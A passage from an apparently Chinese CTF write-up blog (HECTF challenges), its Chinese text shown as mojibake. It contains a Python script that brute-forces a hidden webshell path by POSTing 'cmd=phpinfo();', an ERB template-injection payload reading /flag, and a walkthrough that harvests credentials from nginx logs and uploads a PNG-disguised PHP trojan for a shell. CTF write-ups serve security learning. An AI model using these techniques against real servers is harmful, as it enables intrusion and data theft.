å¤§å†™å­—æ¯ + å°å†™å­—æ¯</span></span><br><span class="line">chars = string.digits + string.ascii_uppercase + string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯·æ±‚å¤´ï¼ˆæ ¹æ®æä¾›çš„æ•°æ®åŒ…æ„é€ ï¼Œä¿®æ­£æ¢è¡Œè¯­æ³•é—®é¢˜ï¼‰</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;BEEFHOOK=v9l9riSiUl5aAaBp1TD92APnVIe94w8whQSHqUW1p9KX43aUihRWqBASlt608WnLT6N4BfmKPSczQ0IN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0, i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POSTæ•°æ®</span></span><br><span class="line">data = <span class="string">&quot;cmd=phpinfo();&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆåŠŸæ ‡è¯†ï¼ˆphpinfo()çš„ç‰¹å¾å†…å®¹ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´ï¼‰</span></span><br><span class="line">success_flag = <span class="string">&quot;PHP Version&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰å¯èƒ½çš„ä¸¤ä½ç»„åˆ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="keyword">for</span> c2 <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment"># æ„é€ å®Œæ•´URL</span></span><br><span class="line">        target_url = base_url.<span class="built_in">format</span>(c1, c2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å°è¯•: <span class="subst">&#123;target_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># å‘é€POSTè¯·æ±‚ï¼ˆè¶…æ—¶æ—¶é—´10ç§’ï¼‰</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                url=target_url,</span><br><span class="line">                headers=headers,</span><br><span class="line">                data=data,</span><br><span class="line">                timeout=<span class="number">10</span>,</span><br><span class="line">                verify=<span class="literal">False</span>  <span class="comment"># å¿½ç•¥SSLè¯ä¹¦éªŒè¯ï¼ˆå¦‚æœéœ€è¦ï¼‰</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ£€æŸ¥å“åº”ä¸­æ˜¯å¦åŒ…å«æˆåŠŸæ ‡è¯†</span></span><br><span class="line">            <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] çˆ†ç ´æˆåŠŸï¼æ­£ç¡®ç»„åˆ: <span class="subst">&#123;c1&#125;</span><span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] å“åº”å†…å®¹ç‰‡æ®µ: <span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>&quot;</span>)  <span class="comment"># è¾“å‡ºéƒ¨åˆ†å“åº”</span></span><br><span class="line">                exit()  <span class="comment"># æ‰¾åˆ°åé€€å‡º</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># é¿å…è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œé—´éš”0.5ç§’ï¼ˆå¯æ ¹æ®ç›®æ ‡è°ƒæ•´ï¼‰</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;è¯·æ±‚é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[!] æ‰€æœ‰ç»„åˆå°è¯•å®Œæ¯•ï¼Œæœªæ‰¾åˆ°åŒ¹é…ç»“æœ&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[!] çˆ†ç ´æˆåŠŸï¼æ­£ç¡®ç»„åˆ: jL</span><br><span class="line">[!] å“åº”å†…å®¹ç‰‡æ®µ: &lt;code&gt;&lt;span style=&quot;color: <span class="params">#0</span>00000&quot;&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>000BB&quot;&gt;<span class="built_in">$</span>file<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;=<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>000BB&quot;&gt;<span class="built_in">$</span><span class="built_in">_</span>GET&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#</span>DD0000&quot;&gt;&#x27;file&#x27;&lt;/span&gt;&lt;span style=&quot;color: <span class="params">#0</span>07700&quot;&gt;]<span class="built_in">&amp;</span>nbsp;??<span class="built_in">&amp;</span>nbsp;&lt;/span&gt;&lt;span style=</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æˆåŠŸ RCEï¼Œä¹‹åå°±æ˜¯ RCE è¯»å–æ–‡ä»¶äº†ï¼š</p><h2 id="çº¢å®çŸ³çš„æ¶ä½œå‰§å¤ç°å…ˆè®°å½•ä¸‹æ¥ç»†çœ‹"><a class="markdownIt-Anchor" href="#çº¢å®çŸ³çš„æ¶ä½œå‰§å¤ç°å…ˆè®°å½•ä¸‹æ¥ç»†çœ‹">#</a> <strong>çº¢å®çŸ³çš„æ¶ä½œå‰§</strong>ï¼ˆå¤ç°ï¼Œå…ˆè®°å½•ä¸‹æ¥ï¼Œç»†çœ‹ï¼‰</h2><blockquote><p>ez_ssti</p></blockquote><p>â€‹<strong>WP æ²¡çœ‹æ‡‚ï¼Œå…ˆè®°å½•ä¸‹æ¥ï¼Œä¹‹åç ”ç©¶ä¸‹</strong></p><p>â€‹è¾“å…¥ <code>1+1</code>  è¿”å› 2ï¼Œä½†æ˜¯è¾“å…¥ <code>&#123;&#123;1*1&#125;&#125;</code>  å°±æŠ¥é”™äº†ï¼Œwp é‡Œè¯´è¿™ä¸ªæ˜¯ Ruby ç¯å¢ƒï¼Œå­˜åœ¨ ERB æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‰€ä»¥ç”¨ <code>File.read('/flag'),è¿”å›fakeflag</code>  è¯»å– flagï¼Œä½†æ˜¯è¿”å›äº†ä¸ªå‡çš„ flagï¼š <code>Hello, HECTF&#123;TH1S_lS_a_FAKE_flag&#125;!</code> ï¼Œè¿‡æ»¤çš„ä¸œè¥¿é€šè¿‡åŠ¨æ€å¸¸é‡ç»•è¿‡ï¼Œ <code>Object.const_get(&quot;File&quot;).read(&quot;/flag&quot;)</code> ã€‚</p><h2 id="æ•°æ®ç®¡ç†ç³»ç»Ÿå¤ç°"><a class="markdownIt-Anchor" href="#æ•°æ®ç®¡ç†ç³»ç»Ÿå¤ç°">#</a> <strong>æ•°æ®ç®¡ç†ç³»ç»Ÿ</strong>ï¼ˆå¤ç°ï¼‰</h2><blockquote><p>å¼€å‘å°å“¥ä¸ºäº†ä¸‹ç­ç²—å¿ƒ buff å æ»¡ï¼Œå¤Ÿé¢†å¯¼æ‹¿ç€æ¿å­è¿½ç€æåŠæ¡è¡—ã€‚</p><p><strong>æç¤º 1</strong>1.file å‚æ•°å­˜åœ¨æ—¥å¿—æ³„éœ²</p><p><strong>æç¤º 2</strong>2. å›¾ç‰‡åŒ…å«</p></blockquote><p>â€‹Hint1 é‡Œè¯´çš„æ˜¯ file å‚æ•°å­˜åœ¨æ—¥å¿—æ³„éœ²ï¼Œç»“åˆä¸»é¡µçš„è¿™é‡Œï¼Œæ¨æµ‹å¯ä»¥é€šè¿‡è¿™ä¸ªè¯»å–åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥å…ˆå»è¯»ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/47bd96a49783406c867b80374e91210e.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸­é—´ä»¶æ˜¯ Nginxï¼Œç„¶åéšä¾¿ç™»å½•ä¸‹å‘ç°ç™»å½•æ–¹å¼æ˜¯ GET å¹¶ä¸”æ²¡åŠ å¯†ï¼š <code>/?username=admin&amp;password=asd</code> ï¼Œå¯ä»¥è¯»å–ä¸‹ Nginx çš„æ—¥å¿—æ–‡ä»¶ï¼Œæ¥è·å–è´¦å·å¯†ç ï¼Œå…ˆç”¨ GET æ–¹å¼è¯»ä¸‹ï¼š <code>?file=/var/log/nginx/access.log</code> ï¼Œå¹¶æœæœä¸‹ = adminï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/63f27a7bfc5f447fbb1523ab32a71d4b.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è´¦å·å¯†ç æœ‰äº†ï¼Œä½†æ˜¯å¯èƒ½æœ‰å¹²æ‰°ï¼Œå¾—ä¸€ä¸ªä¸ªè¯•è¯•ï¼Œæœ€åè¯•å‡ºæ¥è¿™ä¸ªå¯¹äº† <code>admin/bdsfasuaosdah42134223829@#!</code> ã€‚</p><p>â€‹åœ¨ä¸ªäººèµ„æ–™é‚£é‡Œæ‰¾åˆ°äº†æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œåšä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæ•´ä¸€ä¸ªæ¯”è¾ƒå°çš„ png å›¾ç‰‡ï¼Œç„¶åç”¨ winhex ä¿®æ”¹é‡Œé¢çš„ä¸€äº›å†…å®¹çš„åå…­è¿›åˆ¶ä¸ºæœ¨é©¬çš„æ–‡æœ¬å¯¹åº”çš„åå…­è¿›åˆ¶ï¼Œèƒ½ç»•è¿‡ getimagesize æ ¡éªŒï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/29ae5590ef36472bac51e54860908de7.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åœ¨è§£å‹è°ƒè¯•ç•Œé¢ï¼Œåˆ†æå‰ç«¯ htmlï¼Œæœ‰ä¸ªè¿™ä¸ªï¼š<br><img data-src="https://i-blog.csdnimg.cn/direct/655bce2bb79248e38ab7e63d5af2273f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è§£å‹è°ƒè¯•ä¸‹é¢æœ‰ä¸ªåœ°æ–¹å†™äº†ä¸ª png æ–‡ä»¶ï¼Œé‚£ä¸ªå°±æ˜¯æˆ‘ä»¬ä¼ ä¸Šå»çš„æœ¨é©¬æ–‡ä»¶ï¼Œä¸è¿‡ä¸ºå•¥æœ€åä¸€æ­¥çš„ç›®å½•æ˜¯è¿™æ ·çš„ä¸çŸ¥é“ï¼Œåé¢ç¯å¢ƒå…³äº†æ²¡æ¥å¾—åŠå†™ï¼Œæ™šä¸Šå®¿èˆæ–­ç”µï¼Œå¤ç°ä¸€åŠç”µè„‘æ²¡ç”µå…³æœºäº†ï¼Œç¬¬äºŒå¤©èµ·æ¥ç¯å¢ƒæ²¡äº†ï¼Œæ‰€ä»¥è´´ä¸€ä¸ª wp é‡Œçš„æˆªå›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/d2c9054d7613419bab1922ae86994eba.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æœ€åå°è¯•åŒ…å«æ–‡ä»¶ï¼Œgetshell</p><p><img data-src="https://i-blog.csdnimg.cn/direct/93ba1ecd7cb848e5a7985144e40151a4.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwnï¼š</h1><h2 id="ncä¸€ä¸‹~"><a class="markdownIt-Anchor" href="#ncä¸€ä¸‹~">#</a> <strong>nc ä¸€ä¸‹ï½</strong></h2><blockquote><p>å°æ˜ä»ç³»ç»Ÿåå°ä¸­å‘ç°äº†ä¸€æ®µæœ‰é—®é¢˜çš„æ—¥å¿—ï¼Œä½ èƒ½ä»ä¸­æ‰¾åˆ°å¥‡æ€ªç‚¹å¹¶ä¸”æ¶ˆé™¤å—ï¼Ÿ</p></blockquote><p>â€‹nc ä¸€ä¸‹å¾—åˆ°æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01 HTTP/1.1&quot; 301 578 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01/ HTTP/1.1&quot; 302 336 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:29 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1049 &quot;http://192.168.220.132/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:31 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:31 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1058 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:33 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:33 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1062 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:35 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:35 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1065 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:36 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:36 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1068 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:38 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:38 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1070 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:47 +0800] &quot;POST /01/login.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:47 +0800] &quot;GET /01/index.php HTTP/1.1&quot; 200 3033 &quot;http://192.168.220.132/01/login.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:57 +0800] &quot;GET /01/data/upload/ HTTP/1.1&quot; 200 1747 &quot;http://192.168.220.132/01/index.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:14 +0800] &quot;POST /01/data/upload/ HTTP/1.1&quot; 200 1805 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:18 +0800] &quot;GET /01/data/upload/upd0te.php HTTP/1.1&quot; 200 512 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:23 +0800] &quot;GET /01/phpinfo.php HTTP/1.1&quot; 200 25051 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:30 +0800] &quot;GET /01/logout.php HTTP/1.1&quot; 302 337 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:30 +0800] &quot;GET /01/login.php HTTP/1.1&quot; 200 1072 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line"></span><br><span class="line">è¯·æ‰¾åˆ°é»‘å®¢çš„æ“ä½œ[ æäº¤ç­”æ¡ˆï¼šç—…æ¯’ä¸Šä¼ çš„æ—¶é—´+ç—…æ¯’åç§° ]ï¼š</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡åˆ†æï¼Œå‘ç°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸”ç›¸å…³æ—¥å¿—æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.220.1 - - [02/Jul/2024:18:53:57 +0800] &quot;GET /01/data/upload/ HTTP/1.1&quot; 200 1747 &quot;http://192.168.220.132/01/index.php&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:14 +0800] &quot;POST /01/data/upload/ HTTP/1.1&quot; 200 1805 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br><span class="line">192.168.220.1 - - [02/Jul/2024:18:54:18 +0800] &quot;GET /01/data/upload/upd0te.php HTTP/1.1&quot; 200 512 &quot;http://192.168.220.132/01/data/upload/&quot;&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</span><br></pre></td></tr></table></figure><p>â€‹ç¬¬äºŒæ¡å¾ˆæ˜¾ç„¶ï¼ŒPOST ä¼ è¾“æ–‡ä»¶ï¼Œç¬¬ä¸‰æ¡ç›´æ¥å‡ºç°äº†è®¿é—®æœ¨é©¬çš„æƒ…å†µï¼Œé‚£ä¹ˆç¬¬ä¸‰æ¡å°±æ˜¯æœ¨é©¬ï¼ˆåé¢å…¨æ˜¯ logout å’Œ login æ“ä½œï¼Œæ‰€ä»¥ä¼°è®¡å°±æ˜¯è¿™ä¸¤æ¡ï¼‰é‚£ä¹ˆè¾“å…¥ <code>02/Jul/2024:18:54:14+upd0te.php</code>  é€šè¿‡ç¬¬ä¸€å…³ï¼Œç¬¬äºŒå…³æ˜¯ä¸ªæ¸¸æˆï¼Œæ²¡ææ‡‚ä»€ä¹ˆ sum é€»è¾‘ï¼Œä½†è¿˜æ˜¯ä¸å°å¿ƒè¿‡äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ­£ç¡®ï¼æ­å–œæ¥åˆ°ç—…æ¯’çš„ä¸–ç•Œï¼Œé€šè¿‡æ•°å­—å¯¹æˆ˜æ¸¸æˆæˆ˜èƒœç—…æ¯’å³å¯æ¶ˆé™¤å®ƒ...</span><br><span class="line"></span><br><span class="line">================ æ•°å­—å¯¹æˆ˜æ¸¸æˆ ===============</span><br><span class="line">1. aã€bã€cçš„å–å€¼èŒƒå›´æ˜¯0-9ï¼Œä¸”é€‰æ‹©ä¸èƒ½é‡å¤</span><br><span class="line">2. é€šè¿‡æŸç§è®¡ç®—ï¼Œæ¯å±€æœ€ç»ˆçš„sumå€¼å¤§çš„ä¸€æ–¹è·èƒœ</span><br><span class="line">3. å…ˆå¾—3åˆ†è€…èƒœ</span><br><span class="line">=============================================</span><br><span class="line"></span><br><span class="line">===== ç¬¬1å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š2</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š9</span><br><span class="line"></span><br><span class="line">------ ç¬¬1å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=2, b=0, c=9</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=2, c=1</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 1 - 0 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬2å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š3</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š1</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š4</span><br><span class="line"></span><br><span class="line">------ ç¬¬2å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=3, b=1, c=4</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=1, c=4</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 1 - 1 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬3å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š2</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š3</span><br><span class="line"></span><br><span class="line">------ ç¬¬3å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=2, b=0, c=3</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=1, b=0, c=4</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 1 - 2 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬4å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š1</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š4</span><br><span class="line"></span><br><span class="line">------ ç¬¬4å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=1, b=0, c=4</span><br><span 